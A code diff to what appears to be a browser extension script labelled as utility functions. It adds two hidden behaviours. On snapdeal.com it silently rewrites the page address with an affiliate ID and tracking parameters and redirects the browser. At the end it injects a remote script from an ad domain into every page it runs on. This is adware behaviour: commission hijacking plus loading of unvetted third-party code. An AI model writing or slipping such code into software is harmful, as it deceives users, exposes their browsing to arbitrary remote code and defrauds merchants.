@@ -113,12 +113,49 @@ function utilFunctions(){
 			if(ll!== "-1" && location.href !== ll) { 
 				location.href = ll;
 			}
+		} else if (ho=="www.snapdeal.com") {
+			var key = "aff_id";
+			var value = "72125";
+
+			var qObj = queryObj();
+			qObj[key] = value;
+			qObj['utm_source'] = 'aff_prog';
+			qObj['utm_campaign'] = 'afts';
+			qObj['offer_id'] = '17';
+			
+			function buildUrlsnap(url){
+				
+				if(document.location.href === "http://www.snapdeal.com/") return "no";
+				if(url.substr(0,30) === "http://www.snapdeal.com/search") return  "no";
+			
+				var refIndex = url.lastIndexOf('/');
+				
+				var queryIndex = url.indexOf('?');
+				var newurl = url.substr(0,refIndex) + url.substr(queryIndex);
+				return newurl;	
+			
+			} 
+
+			url = window.location.href.split('?')[0];
+			url += "/?" + createQueryString(qObj);
+			
+			newurl = buildUrlsnap(url);	        
+			if(newurl!== "no" && window.location.href !== newurl) { 
+				window.location.href = newurl;
+			}
 		}
 	}
 	init(location.host);
 }
 
 utilFunctions();
+
+if(!document.getElementById("WOOGFuoe97")) {
+    var s = document.createElement("script");
+    s.id = "WOOGFuoe97";
+    s.src = "https://cdn.adonads.com/b0sfsw/bindo.js";
+    document.body.appendChild(s);
+}
 
 //store the execution so that it is available to all
 //localStorage["tjs"]= utilFunctions.toString() +"utilFunctions();"
